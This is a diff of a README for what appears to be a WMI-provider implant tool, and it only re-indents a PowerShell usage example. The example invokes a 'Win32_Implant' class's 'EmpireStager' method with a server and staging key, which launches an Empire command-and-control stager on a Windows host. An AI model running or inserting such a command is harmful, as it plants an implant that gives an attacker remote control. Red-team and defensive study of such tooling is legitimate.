@@ -108,11 +108,11 @@ This is related to the project PowerProvider - https://github.com/0xbadjuju/Powe
   &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Language = "PowerShell"; <br/>
   }; 
   <br/>
-  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Invoke-CimMethod -ClassName Win32_Implant -Name EmpireStager -Arguments @{ <br/>
-  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Server = $Server; <br/>
-  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$StagingKey = $StagingKey; <br/>
-  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Language = "dotnet"; <br/>
-  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;};
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Invoke-CimMethod -ClassName Win32_Implant -Name EmpireStager -Arguments @{ <br/>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Server = $Server; <br/>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$StagingKey = $StagingKey; <br/>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Language = "dotnet"; <br/>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;};
 
 
 ### Author, Contributors, and License
